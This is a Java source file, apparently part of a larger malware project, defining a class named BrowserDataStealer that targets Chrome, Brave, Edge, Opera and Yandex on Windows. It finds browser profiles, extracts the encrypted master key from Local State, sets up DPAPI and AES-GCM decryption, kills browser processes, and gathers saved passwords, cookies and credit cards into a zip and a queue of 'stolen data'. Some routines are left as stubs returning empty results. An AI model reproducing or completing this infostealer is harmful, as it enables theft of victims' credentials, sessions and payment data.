import com.sun.jna.Memory;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class BrowserDataStealer {

    private static final String currentBrowserName;

    private static final List<BrowserProfile> browserProfiles;

    private static final ConcurrentLinkedQueue<String> stolenDataQueue;

    private static DpapiDecryptor dpapiDecryptor;

    public static List<BrowserProfile> discoverBrowserProfiles() {
        List<BrowserProfile> profiles = new ArrayList<>();
        String localAppData = System.getenv("LOCALAPPDATA");
        String appData = System.getenv("APPDATA");

        String[][] browsers = {
            { "Chrome",  localAppData + "\\Google\\Chrome\\User Data" },
            { "Brave",   localAppData + "\\BraveSoftware\\Brave-Browser\\User Data" },
            { "Edge",    localAppData + "\\Microsoft\\Edge\\User Data" },
            { "Opera",   appData + "\\Opera Software\\Opera Stable" },
            { "Yandex",  localAppData + "\\Yandex\\YandexBrowser\\User Data" },
        };

        for (String[] browser : browsers) {
            String name = browser[0];
            String userDataPath = browser[1];
            File userDataDir = new File(userDataPath);

            if (!userDataDir.exists()) continue;

            File[] profileDirs = userDataDir.listFiles(f ->
                f.isDirectory() && (f.getName().equals("Default") || f.getName().startsWith("Profile "))
            );

            if (profileDirs == null) continue;

            for (File profileDir : profileDirs) {

                File localStateFile = new File(userDataPath + "\\Local State");
                byte[] masterKey = readMasterKey(localStateFile);

                if (masterKey != null) {
                    profiles.add(new BrowserProfile(name, profileDir, masterKey));
                }
            }
        }

        return profiles;
    }

    private static byte[] readMasterKey(File localStateFile) {
        try {
            if (!localStateFile.exists()) return null;

            String content = new String(Files.readAllBytes(localStateFile.toPath()), StandardCharsets.UTF_8);
            JSONObject json = new JSONObject(content);

            String encryptedKeyB64 = json
                .getJSONObject("os_crypt")
                .getString("encrypted_key");

            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);

            byte[] dpApiEncrypted = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);

            return decryptWithDpapi(dpApiEncrypted);

        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] decryptWithDpapi(byte[] encryptedData) {
        try {

            Memory inputMem = new Memory(encryptedData.length);
            inputMem.write(0, encryptedData, 0, encryptedData.length);

            return null;
        } catch (Exception e) {
            return null;
        }
    }

    public static List<String> extractPasswords(BrowserProfile profile) {
        List<String> credentials = new ArrayList<>();
        File loginDataFile = new File(profile.profileDir, "Login Data");

        if (!loginDataFile.exists()) return credentials;

        try {

            File tempFile = File.createTempFile("ld_", ".db");
            Files.copy(loginDataFile.toPath(), tempFile.toPath(),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            tempFile.delete();
        } catch (Exception e) {

        }

        return credentials;
    }

    public static List<String> extractCookies(BrowserProfile profile) {
        List<String> cookies = new ArrayList<>();

        File cookiesFile = new File(profile.profileDir, "Network\\Cookies");
        if (!cookiesFile.exists()) {
            cookiesFile = new File(profile.profileDir, "Cookies");
        }

        if (!cookiesFile.exists()) return cookies;

        return cookies;
    }

    public static List<String> extractCreditCards(BrowserProfile profile) {
        List<String> cards = new ArrayList<>();
        File webDataFile = new File(profile.profileDir, "Web Data");
        if (!webDataFile.exists()) return cards;

        return cards;
    }

    private static String decryptAesGcm(byte[] encryptedValue, byte[] masterKey) {
        try {

            byte[] iv = Arrays.copyOfRange(encryptedValue, 3, 15);
            byte[] ciphertext = Arrays.copyOfRange(encryptedValue, 15, encryptedValue.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
            GCMParameterSpec paramSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, paramSpec);

            return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    public static void stealAll(ZipBuilder zipBuilder) {
        List<BrowserProfile> profiles = discoverBrowserProfiles();

        for (BrowserProfile profile : profiles) {
            CompletableFuture.runAsync(() -> {
                try {

                    ProcessKiller.killBrowsers();
                    TimeUnit.MILLISECONDS.sleep(500);

                    List<String> passwords = extractPasswords(profile);
                    List<String> cookies = extractCookies(profile);
                    List<String> cards = extractCreditCards(profile);

                    if (!passwords.isEmpty()) {
                        String content = formatPasswords(profile.browserName, passwords);
                        zipBuilder.addEntry(profile.browserName + "_passwords.txt", content.getBytes());
                        stolenDataQueue.offer(content);
                    }

                    if (!cookies.isEmpty()) {
                        String content = formatCookies(profile.browserName, cookies);
                        zipBuilder.addEntry(profile.browserName + "_cookies.txt", content.getBytes());
                    }

                    if (!cards.isEmpty()) {
                        String content = formatCards(profile.browserName, cards);
                        zipBuilder.addEntry(profile.browserName + "_cards.txt", content.getBytes());
                    }

                } catch (Exception e) {

                }
            });
        }
    }

    private static String formatPasswords(String browser, List<String> passwords) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== ").append(browser).append(" Passwords ===\n\n");
        for (String cred : passwords) {
            sb.append(cred).append("\n");
        }
        return sb.toString();
    }

    private static String formatCookies(String browser, List<String> cookies) {
        StringBuilder sb = new StringBuilder();
        sb.append("# Netscape HTTP Cookie File\n");
        sb.append("# Browser: ").append(browser).append("\n\n");
        for (String cookie : cookies) {
            sb.append(cookie).append("\n");
        }
        return sb.toString();
    }

    private static String formatCards(String browser, List<String> cards) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== ").append(browser).append(" Credit Cards ===\n\n");
        for (String card : cards) {
            sb.append(card).append("\n");
        }
        return sb.toString();
    }

    public static class BrowserProfile {
        public final String browserName;
        public final File profileDir;
        public final byte[] masterKey;

        public BrowserProfile(String browserName, File profileDir, byte[] masterKey) {
            this.browserName = browserName;
            this.profileDir = profileDir;
            this.masterKey = masterKey;
        }
    }

    static {
        browserProfiles = new ArrayList<>();
        stolenDataQueue = new ConcurrentLinkedQueue<>();
        currentBrowserName = "";
    }
}